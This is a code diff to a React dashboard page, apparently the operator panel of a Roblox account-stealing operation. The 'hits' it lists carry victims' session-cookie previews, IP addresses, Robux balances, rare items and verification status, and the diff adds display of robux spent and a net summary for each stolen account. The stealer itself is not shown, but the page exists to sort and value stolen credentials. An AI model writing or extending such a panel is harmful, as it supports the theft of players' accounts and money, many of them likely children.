@@ -19,6 +19,8 @@ interface HitRow {
   roblox_voice_enabled: boolean | null;
   roblox_age_verified: boolean | null;
   roblox_gamepass_earnings: number | null;
+  roblox_robux_spent: number | null;
+  roblox_summary: number | null;
   roblox_headshot_url: string | null;
   cookie_preview: string | null;
   ip_address: string | null;
@@ -35,7 +37,7 @@ const HitsPage = () => {
   const [referralCount, setReferralCount] = useState<number>(0);
   const audioRef = useRef<HTMLAudioElement | null>(null);
 
-  const SELECT_COLS = 'id, tool_type, roblox_username, roblox_robux, roblox_rap, roblox_premium, roblox_has_korblox, roblox_has_headless, roblox_voice_enabled, roblox_age_verified, roblox_gamepass_earnings, roblox_headshot_url, cookie_preview, ip_address, created_at';
+  const SELECT_COLS = 'id, tool_type, roblox_username, roblox_robux, roblox_rap, roblox_premium, roblox_has_korblox, roblox_has_headless, roblox_voice_enabled, roblox_age_verified, roblox_gamepass_earnings, roblox_robux_spent, roblox_summary, roblox_headshot_url, cookie_preview, ip_address, created_at';
 
   // Load referral count
   useEffect(() => {
@@ -210,6 +212,8 @@ const HitsPage = () => {
                       <span>RAP: <span className="text-gray-200">{h.roblox_rap ?? '?'}</span></span>
                       <span>Premium: <span className="text-gray-200">{h.roblox_premium === null ? '?' : h.roblox_premium ? 'Yes' : 'No'}</span></span>
                       <span className="flex items-center gap-1"><Coins className="h-3 w-3" />Gamepass: <span className="text-gray-200">{h.roblox_gamepass_earnings?.toLocaleString() ?? '?'}</span></span>
+                      <span>Spent: <span className="text-gray-200">{h.roblox_robux_spent?.toLocaleString() ?? '?'}</span></span>
+                      <span>Summary: <span className={h.roblox_summary !== null && h.roblox_summary < 0 ? 'text-red-300' : 'text-gray-200'}>{h.roblox_summary !== null ? `${h.roblox_summary >= 0 ? '+' : ''}${h.roblox_summary.toLocaleString()}` : '?'}</span></span>
                       <span>Korblox: <span className="text-gray-200">{h.roblox_has_korblox === null ? '?' : h.roblox_has_korblox ? 'Yes' : 'No'}</span></span>
                       <span>Headless: <span className="text-gray-200">{h.roblox_has_headless === null ? '?' : h.roblox_has_headless ? 'Yes' : 'No'}</span></span>
                       <span>Voice: <span className="text-gray-200">{h.roblox_voice_enabled === null ? '?' : h.roblox_voice_enabled ? 'Yes' : 'No'}</span></span>
